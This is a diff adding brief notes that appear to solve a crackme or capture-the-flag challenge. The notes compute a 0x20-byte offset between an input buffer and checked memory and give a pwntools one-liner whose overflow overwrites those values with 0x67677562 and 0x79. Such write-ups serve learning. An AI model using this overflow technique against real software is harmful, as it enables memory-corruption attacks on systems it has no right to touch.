@@ -1,0 +1,13 @@
+Memory Context:
+.data:00403374 INPUT           
+.data:00403394 thing_checked                  
+.data:00403398 nr_mere       
+
+Our input will be loaded at address: 0x0403374
+The 4 bytes which are checked are located at address: 0x00403394
+
+=> 0x00403394 - 0x0403374 = 0x20 (bytes of padding, followed by p32(0x67677562) in order to overwrite 0x00403394 with val 1734833506 then we will add one more byte 0x79 in order to overwrite 0x00403398 with 121 )
+
+payload:  python -c "from pwn import *; print 'A'*0x20 + p32(0x67677562) + chr(0x79)" > input.txt
+also execute: truncate -s -1 input.txt ( to get rid of the 0xa at the end )
+
